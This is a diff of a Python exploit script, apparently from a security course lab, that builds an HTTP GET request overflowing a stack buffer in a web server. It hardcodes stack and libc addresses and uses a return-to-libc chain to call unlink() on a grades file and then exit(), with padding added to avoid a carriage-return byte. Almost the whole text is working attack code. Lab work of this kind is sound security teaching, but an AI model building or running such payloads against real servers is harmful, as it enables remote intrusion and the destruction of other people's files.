@@ -17,15 +17,14 @@ import struct
 # which you can then use in build_exploit(); the following are just
 # examples.
 
-stack_buffer = 0xbfffe6d8 
-stack_saved_ebp = 0xbfffeee8
+stack_buffer = 0xbfffee08 
+stack_saved_ebp = 0xbffff618
 stack_retaddr = stack_saved_ebp + 4
 
+libc_unlink_addr = 0x40102450 
+path_arg_addr = 0x08050e90 
+libc_exit_addr = 0x40058150
 
-libc_system_addr = 0xb7e6b100
-libc_exit_addr = 0xb7e5e150
-libc_unlink_addr = 0xb7f08450
-path_arg_addr = 0x08050d63
 
 # This is the function that you should modify to construct an
 # HTTP request that will cause a buffer overflow in some part
@@ -48,13 +47,20 @@ def build_exploit(shellcode):
     targetbufsize = stack_retaddr - stack_buffer
     hello = b'/'
     targetbufsize = targetbufsize - 1
+
     for i in range(targetbufsize):
         hello += b'A'
-    hello += b'\x50\x84\xf0\xb7' # Reverse order because of endianism
-    tail = b'?FPATH=/home/httpd/lab/grades.txt'
-    word = b'\x11\x11\x11\x11'
-    argstuff = b'\x63\x0d\x05\x08'
-    test = b'GET ' + hello + word + argstuff + tail + b' HTTP/1.0\r\n' + b'\r\n'
+
+    hello += b'\x50\x24\x10\x40' # Reverse order because of endianism
+    word = b'\x50\x81\x05\x40'
+    argstuff = b'\x90\x0e\x05\x08'
+    
+    # this is used so we don't have 0d while it's in buf
+    tailpad = b''
+    for i in range(300):
+        tailpad += b'C'
+    tailpad += b'/home/httpd/grades.txt'
+    test = b'GET ' + hello + word + argstuff + tailpad + b' HTTP/1.0\r\n' + b'\r\n'
 
     return test
 
